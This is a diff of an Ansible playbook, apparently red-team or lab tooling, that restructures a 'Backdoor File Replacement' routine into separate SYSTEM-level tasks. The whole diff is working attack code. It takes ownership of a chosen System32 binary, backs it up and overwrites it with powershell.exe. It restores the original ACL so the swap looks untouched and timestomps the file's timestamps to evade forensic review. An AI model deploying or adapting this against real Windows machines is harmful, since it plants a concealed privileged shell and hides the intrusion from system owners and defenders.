@@ -3,27 +3,47 @@
     path: "C:\\Windows\\System32\\{{ target }}"
   register: file_info
 
-- name: "Backdoor File Replacement for {{ target }}"
+- name: "Backdoor File Replacement for {{ target }} - Takeown"
   ansible.windows.win_shell: |
-    # 1. Take ownership and modify ACLs to allow replacement
     $targetPath = "C:\Windows\System32\{{ target }}"
     {% raw %}
-    $Acl = Get-Acl $targetPath
+    #$Acl = Get-Acl $targetPath
+    (Get-Acl $targetPath).Sddl
     takeown /f $targetPath
-    icacls $targetPath /grant administrators:F
+    icacls $targetPath /grant administrators:F{% endraw %}
+  register: original_sddl
+  become: yes
+  become_method: runas
+  become_user: System
     
-    # 2. Backup original if backup doesn't exist
+- name: "Backdoor File Replacement for {{ target }} - Backup"
+  ansible.windows.win_shell: |
+    $targetPath = "C:\Windows\System32\{{ target }}"
     $backupPath = $targetPath + ".outdated"
     if (-not (Test-Path $backupPath)) {
         Move-Item $targetPath $backupPath -Force
     }
+  become: yes
+  become_method: runas
+  become_user: System
 
-    # 3. Replace with PowerShell
+- name: "Backdoor File Replacement for {{ target }} - Replace"
+  ansible.windows.win_shell: |
+    $targetPath = "C:\Windows\System32\{{ target }}"
     Copy-Item "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" $targetPath -Force
-    Set-Acl $targetPath $Acl
+    $sddl = "{{ original_sddl.stdout.strip() }}"
+    $Acl = New-Object System.Security.AccessControl.FileSecurity
+    $Acl.SetSecurityDescriptorSddlForm($sddl)
+    Set-Acl -Path $targetPath -AclObject $Acl
+    #Set-Acl $targetPath $Acl
+  become: yes
+  become_method: runas
+  become_user: System
 
-    # 4. Timestomp
-    (Get-Item $targetPath).CreationTime = Get-Date {% endraw %}"{{ file_info.stat.creationtime }}"{% raw %}
+- name: "Backdoor File Replacement for {{ target }} - Timestomp"
+  ansible.windows.win_shell: |
+    $targetPath = "C:\Windows\System32\{{ target }}"
+    {% raw %}(Get-Item $targetPath).CreationTime = Get-Date {% endraw %}"{{ file_info.stat.creationtime }}"{% raw %}
     (Get-Item $targetPath).LastWriteTime = Get-Date {% endraw %}"{{ file_info.stat.lastwritetime }}"{% raw %}
     (Get-Item $targetPath).LastAccessTime = Get-Date {% endraw %}"{{ file_info.stat.atime }}"{% raw %}
 
